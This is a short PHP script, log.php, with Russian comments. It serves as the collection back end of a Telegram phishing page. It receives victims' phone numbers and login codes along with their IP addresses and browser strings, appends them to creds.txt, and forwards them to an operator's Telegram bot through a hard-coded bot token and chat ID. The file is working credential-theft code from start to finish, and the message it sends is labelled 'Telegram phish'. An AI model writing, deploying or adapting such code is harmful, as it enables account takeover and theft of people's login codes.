<?php
// language: PHP, file: log.php, target: любой LAMP/LEMP
// *принимает JSON POST, пишет в creds.txt, дублирует в Telegram-бота*

header('Content-Type: application/json');

$logfile = __DIR__ . '/creds.txt';
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['ok' => false]);
    exit;
}

$phone  = $data['phone']  ?? 'N/A';
$code   = $data['code']   ?? '—';
$stage  = $data['stage']  ?? 'unknown';
$ip     = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time   = date('Y-m-d H:i:s');

$entry  = "========================================\n";
$entry .= "Time:  $time\n";
$entry .= "Stage: $stage\n";
$entry .= "Phone: $phone\n";
$entry .= "Code:  $code\n";
$entry .= "IP:    $ip\n";
$entry .= "UA:    $ua\n";
$entry .= "========================================\n\n";
file_put_contents($logfile, $entry, FILE_APPEND | LOCK_EX);

$botToken = '8797221109:AAFp2NVt569Lzm0j5M79Uct8-Gsc1RdZd5Y';
$chatId   = '5743634736';
$msg  = "🔐 Telegram phish\n";
$msg .= "Stage: $stage\n";
$msg .= "Phone: $phone\n";
if ($code !== '—') $msg .= "Code: $code\n";
$msg .= "IP: $ip";
@file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));

echo json_encode(['ok' => true]);
